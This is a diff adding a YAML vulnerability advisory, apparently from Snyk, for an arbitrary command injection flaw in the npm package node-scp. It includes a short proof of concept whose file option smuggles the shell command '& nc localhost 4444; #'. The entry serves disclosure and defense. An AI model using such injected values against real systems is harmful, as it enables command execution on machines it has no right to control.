@@ -1,0 +1,27 @@
+---
+- id: snykio:npm:node-scp:568772
+  title: Arbitrary Command Injection
+  description: "[node-scp][1] is a Lightweight, fast and secure SCP function for NodeJS\n\nAffected
+    versions of this package are vulnerable to Arbitrary Command\nInjection. The issue
+    occurs because user input is formatted inside a\n`command` that will be executed
+    without any checks.\n\n### PoC By Snyk Security Team   {#poc-by-snyk-security-team}\n\n
+    \   var scp = require('scp');\n    \n    var options = {\n        file: '& nc
+    localhost 4444; #',\n        user: 'username',\n        host: 'myServer',\n        port:
+    '20',\n        path: '~'\n    }\n    \n    scp.send(options, function (err) {\n
+    \       if (err) console.log(err);\n        else console.log('File transferred.');\n
+    \   });\n\n\n\n[1]: https://www.npmjs.com/package/node-scp\n"
+  affected_package: node-scp
+  vulnerable_versions:
+  - "*"
+  severity: high
+  package_manager: npm
+  cwe:
+  - CWE-78
+  disclosed_date: 2020-05-07
+  created_date: 2020-06-21
+  last_modified_date: 2020-06-21
+  credit:
+  - Mik317
+  references:
+  - https://github.com/ecto/node-scp/issues/28
+  source_url: https://snyk.io/vuln/SNYK-JS-NODESCP-568772
